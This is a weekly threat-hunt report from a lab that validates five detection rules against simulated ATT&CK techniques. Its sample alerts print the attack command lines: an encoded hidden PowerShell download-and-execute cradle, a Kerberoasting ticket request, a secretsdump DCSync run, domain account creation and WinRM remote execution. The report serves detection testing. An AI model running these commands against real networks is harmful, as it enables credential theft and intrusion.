# hunt_report
Week 9 Hunt Report
------------------

Generated: 2026-11-06T03:53:14

Dataset
-------

*   Events ingested: **23**
*   Time range: `2026-11-03T14:02:11.482Z` to `2026-11-03T14:15:44.008Z`
*   Alerts raised: **5**

Rule Results
------------

| Rule | Technique | Detection | Alerts | First seen | Last seen |
| --- | --- | --- | --- | --- | --- |
| R-101 | T1059.001 | Suspicious PowerShell execution | 1   | 2026-11-03T14:02:11 | 2026-11-03T14:02:11 |
| R-102 | T1558.003 | Kerberoasting service ticket request | 1   | 2026-11-03T14:04:18 | 2026-11-03T14:04:18 |
| R-103 | T1003.006 | DCSync replication abuse | 1   | 2026-11-03T14:05:03 | 2026-11-03T14:05:03 |
| R-104 | T1136.002 | Domain account created via net.exe | 1   | 2026-11-03T14:08:12 | 2026-11-03T14:08:12 |
| R-105 | T1021.006 | Remote execution over WinRM | 1   | 2026-11-03T14:10:47 | 2026-11-03T14:10:47 |
| R-106 | T1087.002 | AD reconnaissance tooling (demo rule) | disabled | \-  | \-  |

Test Plan Coverage
------------------

| Test | Technique | Atomic test | Rule | Verdict |
| --- | --- | --- | --- | --- |
| 1   | T1059.001 | PowerShell - Encoded Command | R-101 | DETECTED (1) |
| 2   | T1558.003 | Requesting a Service Ticket using PowerShell | R-102 | DETECTED (1) |
| 3   | T1003.006 | DCSync | R-103 | DETECTED (1) |
| 4   | T1136.002 | Create New Domain Account using net.exe | R-104 | DETECTED (1) |
| 5   | T1021.006 | WinRM - Execute Remote Command | R-105 | DETECTED (1) |

Sample Alerts
-------------

### R-101 - Suspicious PowerShell execution (T1059.001)

*   Time: 2026-11-03T14:02:11.482Z
*   Host/User: LAB-ADMIN01.lab.local / LAB\\labadmin
*   Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
*   CommandLine: `"powershell.exe" -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTeXN0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AC8AcABpAG4AZwAuAHQAcABsACcAKQA=`

### R-102 - Kerberoasting service ticket request (T1558.003)

*   Time: 2026-11-03T14:04:18.930Z
*   Host/User: LAB-ADMIN01.lab.local / LAB\\labadmin
*   Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
*   CommandLine: `"powershell.exe" -Command "$search = New-Object System.DirectoryServices.DirectorySearcher([ADSI]\'LDAP://DC=lab,DC=local\',\'(servicePrincipalName=*)\'); $results = $search.FindAll(); foreach ($r in $results) { $id = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($r.Properties.serviceprincipalname[0]) }"`

### R-103 - DCSync replication abuse (T1003.006)

*   Time: 2026-11-03T14:05:03.774Z
*   Host/User: LAB-ADMIN01.lab.local / LAB\\labadmin
*   Image: `C:\Python312\python.exe`
*   CommandLine: `"python.exe" C:\Tools\impacket\examples\secretsdump.py lab.local/labadmin@LAB-DC01.lab.local -just-dc`

### R-104 - Domain account created via net.exe (T1136.002)

*   Time: 2026-11-03T14:08:12.517Z
*   Host/User: LAB-ADMIN01.lab.local / LAB\\labadmin
*   Image: `C:\Windows\System32\net.exe`
*   CommandLine: `"net.exe" user lab_hunt01 P@ssw0rd123! /add /domain`

### R-105 - Remote execution over WinRM (T1021.006)

*   Time: 2026-11-03T14:10:47.661Z
*   Host/User: LAB-ADMIN01.lab.local / LAB\\labadmin
*   Image: `C:\Windows\System32\winrs.exe`
*   CommandLine: `"winrs.exe" -r:LAB-WS01.lab.local whoami`